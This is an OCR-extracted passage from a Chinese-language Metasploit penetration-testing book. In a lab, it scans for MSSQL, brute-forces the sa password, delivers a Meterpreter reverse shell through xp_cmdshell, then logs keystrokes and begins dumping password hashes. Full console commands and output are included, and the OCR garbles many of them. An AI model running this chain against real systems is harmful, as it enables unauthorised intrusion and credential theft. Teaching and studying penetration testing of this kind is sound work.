The number of concurrent threads
USERNAME Sa
ou
Theusernametoauthenticateas
msf auxiliary(mssql_ping)> set RH0STS 192.168.33.1/24
RHOSTS=> 192.168.33.1/24
msf auxiliary(mssql_ping)> set THREADS 20
THREADS => 20
msf auxiliary(mssql_ping) > exploit
[*]Scanned040 of 256hosts(015% complete)
[*]Scanned 052of 256hosts（o20%complete)
[*]Scanned 080 of 256hosts(031% complete)
[*]Scanned 115 of 256 hosts (044% complete)
77
---
## Page 105
Metasploit渗透测试指南
[*]
SQL Server information for 192.168.33.130:0
[*]
ServerName
=IHAZSECURITY
[*]
InstanceName
=SQLEXPRESS
[*]
IsClustered
=No
[*]
Version
=9.00.1399.06③
[*]
tcp
=1433①
[*]
np
[*] Scanned 129 of 256 hosts (050% complete)
通过usescanner/mssql/mssql_ping命令调用mssql_ping模块和设置参数，然后运行，
可以看到SQL服务器安装在192.168.33.130O上，服务器名为IHAZSECURITY?。版本号为
9.00.1399.06?（SQLServer2005），监听的端口号是14330。
6.1.3暴力破解MSSQL服务器
下--步，我们利用Metasploit框架的mssql_login模块来进行暴力破解：
msf > use scanner/mssql/mssql_login 0
msf auxiliary(mssql_login) > show options
Module options:
Name
Current Setting
Required
Description
BRUTEFORCE_SPEED5
yes
How fast to bruteforce,from o to 5
PASSWORD
no
The password for the specified username
PASS_FILE
no
File containing passwords, one per line
RHOSTS
yes
The target address range or CIDR identifier
RPORT
1433
yes
The target port
THREADS
1
yes
The number of concurrent threads
USERNAME
sa
no
The username to authenticate as
USERPASS_FILE
no
File containing users and passwords
separated by space,one pair per line
USER_FILE
no
File containing usernames,one per line
VERBOSE
true
yes
Whether to print output for all attempts
msf auxiliary(mssql_login) > set PASs_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt @
PASS_FILE =>/pentest/exploits/fasttrack/bin/dict/wordlist.txt
msf auxiliary(mssql_login) > set RH0STS 192.168.33.130
RHOSTS => 192.168.33.130
msf auxiliary(mssql_login)> set THREADS 10
THREADS => 10
msf auxiliary(mssql_login) > set verbose false
verbose=>false
msf auxiliary(mssql_login)>exploit
[+] 192.168.33.130:1433 - MSSQL - successful login'sa′:‘password123'
[*]Scanned 1 of 1 hosts(100%complete)
[*] Auxiliary module execution completed
78
---
## Page 106
第6章Meterpreter
选择mssql_login模块0，使用Fast-Track中的密码列表?。（我们将在11章介绍Fast-Track
的更多细节），成功猜解出了sa口令：password123③。
提示：Fast-Track是本书其中一位作者编写的一个工具，集成了多种攻击方式、漏洞利用
以及Metasploit框架，来进行攻击载荷的自动植入。Fast-Track的一个功能特性是可以暴力破
解和自动攻击MSSQL。
6.1.4 xp_cmdshell
以sa管理员账户权限运行MS SQL时，我们可以执行xp_cmdshell存储过程，该存储过程
允许我们直接与底层操作系统进行交互并执行命令。xp_cmdshell是SQLServer中缺省装载的内
建存储程序，我们可以通过MSSQL调用xp_cmdshell直接来执行操作系统命令，可以将其理
解成一个可以执行任意命令的操作系统超级用户命令行。而MSSQL服务一般是以SYSTEM级
别权限运行的，所以一旦获得sa用户，就可以同时以管理员身份来访问MSSQL和底层操作
系统。
为了在系统中注入攻击载荷，我们需要与xP_cmdshell进行交互，添加本地管理员，并通
过一个可执行文件来植入攻击载荷。DavidKennedy和JoshuaDrake（iduck）已经编写了一个模
块（mssql_payload)，可以通过xp_cmdshell来植入任意Metasploit攻击载荷：
msf>usewindows/mssql/mssql_payload0
msf exploit(mssql_payload) > show options
Module options:
Name
Current Setting RequiredDescription
PASSWORD
no
Thepasswordforthespecifiedusername
RHOST
yes
The target address
RPORT
1433
yes
The target port
USERNAME
sa
no
Theusernametoauthenticate as
UseCmdStager
true
ou
Wait for user input before returning from exploit
VERBOSE
false
no
Enable verbose output
Exploit target:
IdName
Automatic
msf exploit(mssql_payload) > set payload windows/meterpreter/reverse_tcp 
payload =>windows/meterpreter/reverse_tcp
msf exploit(mssql_payload)>set LH0ST 192.168.33.129
LHOST => 192.168.33.129
79
---
## Page 107
Metasploit渗透测试指南
msf exploit(mssql_payload)> set LPoRT 443
LPORT => 443
msf exploit(mssql_payload) > set RHoST 192.168.33.130
RHOST => 192.168.33.130
PASSWORD => password123
msf exploit(mssql_payload)>exploit
[*]Started reverse handler on 192.168.33.129:443
[*] Command Stager progress - 2.78% done (1494/53679 bytes)
[*] Command Stager progress - 8.35% done (4482/53679 bytes)
.SNIP..
[*]Sending stage(748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1699)
meterpreter>③
选择mssql_payload模块①后，设置我们的攻击载荷为meterpreter，在启动Meterpreter会
话之前我们所要做的就是对标准参数进行配置。执行exploit之后，Meterpreter会话在目标机上
成功开启③。
回顾-下，我们先是用mssql_ping模块找到MSSQL服务，并使用mssql_login模块猜解
MSSQL的sa口令一password123，然后使用mssql_payload 模块与MSSQL交互并上传
Meterpretershell，从而实现了对系统的完整入侵过程。一旦获取了Meterpretershell，我们就可
以对系统进行更深入的攻击拓展。
6.1.5Meterpreter 基本命令
成功入侵系统并获得系统的Meterpreter会话之后，我们可以利用一些基本的Meterpreter
命令，来收集更多的信息。在任意位置使用help命令都可以得到如何使用Meterpreter的帮助
信息。
1．截屏
Meterpreter的screenshot命令可以获取活动用户的桌面截屏并保存到/opt/metasploit3/msf3/
目录，如图6-1所示。
meterpreter>screenshot
Screenshot saved to:/opt/metasploit3/msf3/yVHXaZar.jpeg
桌面截屏是获取目标系统信息的一个重要途径。如图6-1所示，可以看到安装运行了McAfee
80
---
## Page 108
第6章Meterpreter
图6-1Meterpreter截屏
2. sysinfo
另一个需要详细说明的命令是sysinfo，这个命令可以获取系统运行的平台，如下所示：
meterpreter>sysinfo
Computer:IHAZSECURITY
OS
:Windows XP (Build 26o0,Service Pack 2).
Arch
：x86
Language: en_US
可以看到，操作系统是WindowsXPServicePack2，因为SP2已不再维护，这意味着系统
存在一大堆漏洞。
6.1.6获取键盘记录
现在我们需要获得系统的密码，可以使用破解或攻击的方法，也可以在远程主机上进行键
盘记录。但在此之前，还是让我们用ps命令来获得目标系统正在运行的进程吧。
meterpreter>ps 0
Process list
PID
Name
Arch Session User
Path
0
[System Process]
System
x86
0
NTAUTHORITY\SYSTEM
..SNIP.··
81
---
## Page 109
Metasploit渗透测试指南
1476 spoolsv.exe
x86
NT AUTHORITY\SYSTEM
C:\WINDOWS\
system32\spo0olsv.exe
1668 explorer.exe 
x86
0
IHAZSECURITY\Administrator
C:\WINDOWS\
Explorer,EXE
·.SNIP..：
4032 notepad.exe
x86
。
IHAZSECURITY\Administrator
C:\WINDOWS\
system32\notepad.exe
meterpreter>migrate1668③
[*] Migrating to 1668...
[*]Migration completed successfully.
meterpreter>runpost/windows/capture/keylog_recorder
[*]Executing moduleagainstV-MAC-XP
[*]Starting thekeystroke sniffer...
[*]Keystrokesbeingsavedinto/root/.msf3/loot/
20110324171334_default_192.168.1.195_host.windows.key_179703.txt
[*]Recording keystrokes...
[*] Saving last few keystrokes...
root@bt:~# cat /root/.msf3/loot/20110324171334_default_192.168.1.195_host.windows.key_179703.txt @
Keystroke1og started atThu Mar 24 17:13:34-0600 2011
administratorpasswordpassword123!!
执行ps命令0获得了包括explorer.exe在内的进程列表。我们使用migrate命令③将会话
迁移至explorer.exe的进程空间中，之后启动keylog_recorder 模块·。一段时间后使用CTRL-C
中止，最后，在另一个终端里，可以看到我们使用键盘记录所捕捉到的内容。
6.2挖掘用户名和密码
在先前的例子中，我们通过键盘记录获取用户输入得到密码。如果不使用键盘记录，同样
也可以用Meterpreter来获取系统本地文件中的用户名和密码哈希值。
6.2.1提取密码哈希值
本次攻击使用Meterpreter中的hashdump输入模块，来提取系统的用户名和密码哈希值。
或NT LAN Manager v2(NTLMv2)。
例如，在LM存储方式中，当用户首次输入密码或更改密码的时候，密码被转换为哈希值。
由于哈希长度的限制，将密码切分为7个字符一组的哈希值。以password123456的密码为例，